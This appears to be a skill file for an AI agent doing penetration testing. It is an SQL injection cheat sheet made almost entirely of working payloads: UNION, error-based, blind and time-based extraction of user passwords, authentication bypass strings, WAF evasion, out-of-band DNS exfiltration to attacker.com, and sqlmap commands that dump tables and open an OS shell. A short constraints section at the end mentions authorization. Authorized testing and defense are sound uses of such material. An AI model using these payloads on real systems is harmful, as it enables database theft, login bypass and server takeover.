---
name: sql-injection-testing
description: SQL injection testing techniques. Detection, UNION-based, blind, time-based, and error-based extraction. Filter bypass and authentication bypass methods.
---

# SQL Injection Testing

Comprehensive SQL injection vulnerability assessment techniques.

---

## Detection Phase

### Identify Injectable Parameters

Common injection points:
- URL parameters: `?id=1`, `?user=admin`
- Form fields: username, password, search
- Cookie values: session_id, preferences
- HTTP headers: User-Agent, Referer, X-Forwarded-For

### Basic Vulnerability Tests

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon (query stacking)
;
```

**Monitor for:**
- Database error messages
- HTTP 500 errors
- Modified response content/length
- Unexpected behavior

### Boolean Logic Tests

```sql
-- True condition
?id=1 or 1=1
?id=1' or 1=1--
?id=1" or 1=1--

-- False condition
?id=1 and 1=2
?id=1' and 1=2--
```

Compare responses between true/false to confirm injection.

---

## Exploitation Techniques

### UNION-Based Extraction

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Error-Based Extraction

```sql
-- MSSQL
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL (XPATH)
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL
1' AND 1=CAST((SELECT version()) AS int)--
```

### Blind Boolean-Based

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

### Time-Based Blind

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

### Out-of-Band (OOB)

```sql
-- MSSQL DNS exfil
1; EXEC master..xp_dirtree '\\attacker.com\share'--

-- MySQL DNS (if LOAD_FILE available)
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
```

---

## Authentication Bypass

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
') OR ('1'='1
') OR ('1'='1'--

-- How it works:
-- Original: SELECT * FROM users WHERE username='input' AND password='input'
-- Injected: SELECT * FROM users WHERE username='admin'--' AND password='x'
```

---

## Filter Bypass Techniques

### Character Encoding

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527

-- Hex strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin'
```

### Whitespace Bypass

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

### Keyword Bypass

```sql
-- Case variation
SeLeCt, sElEcT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION
```

---

## SQLMap Usage

```bash
# Basic test
sqlmap -u "http://$TARGET/page?id=1"

# Enumerate databases
sqlmap -u "http://$TARGET/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://$TARGET/page?id=1" -D database --tables

# Dump table
sqlmap -u "http://$TARGET/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://$TARGET/page?id=1" --os-shell

# POST request
sqlmap -u "http://$TARGET/login" --data="user=admin&pass=test"

# Bypass WAF
sqlmap -u "http://$TARGET/page?id=1" --tamper=space2comment

# Aggressive mode
sqlmap -u "http://$TARGET/page?id=1" --risk=3 --level=5
```

---

## Database Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
```

---

## Quick Reference

| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No error messages | Use blind techniques |
| UNION fails | Verify column count with ORDER BY |
| WAF blocking | Use encoding/tamper scripts |
| Payload not executing | Try different comment syntax |
| Time-based inconsistent | Use longer delays (10+ sec) |

---

## Constraints

- Never execute destructive queries (DROP, DELETE) without explicit authorization
- Limit extraction to proof-of-concept quantities
- Stop if production data with real users discovered
- Document all findings in PTT
